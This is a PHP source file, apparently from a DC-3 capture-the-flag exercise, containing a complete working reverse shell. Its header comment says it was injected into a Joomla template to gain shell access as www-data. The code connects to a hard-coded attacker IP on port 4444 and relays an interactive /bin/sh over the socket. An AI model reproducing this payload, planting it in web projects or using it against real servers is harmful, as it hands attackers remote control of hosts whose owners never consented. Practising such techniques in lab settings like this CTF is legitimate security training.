<?php
/**
 * PHP Reverse Shell for DC-3 CTF
 *
 * This payload was injected into Joomla's template index.php
 * to gain reverse shell access as www-data
 */

// Attacker configuration
$ip = '10.109.172.45';   // Attacker IP address
$port = 4444;             // Attacker listening port

// Create socket connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);

if (!$sock) {
    echo "Error: $errstr ($errno)\n";
    exit(1);
}

// Execute shell and bind to socket
$proc = proc_open('/bin/sh -i', array(
    0 => array('pipe', 'r'),  // stdin
    1 => array('pipe', 'w'),  // stdout
    2 => array('pipe', 'w')   // stderr
), $pipes);

if (is_resource($proc)) {
    stream_set_blocking($pipes[0], false);
    stream_set_blocking($pipes[1], false);
    stream_set_blocking($pipes[2], false);
    stream_set_blocking($sock, false);

    while (!feof($sock)) {
        if (!feof($sock)) {
            fwrite($pipes[0], fread($sock, 2048));
        }
        if (!feof($pipes[1])) {
            fwrite($sock, fread($pipes[1], 2048));
        }
        if (!feof($pipes[2])) {
            fwrite($sock, fread($pipes[2], 2048));
        }
    }

    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($proc);
}

fclose($sock);
?>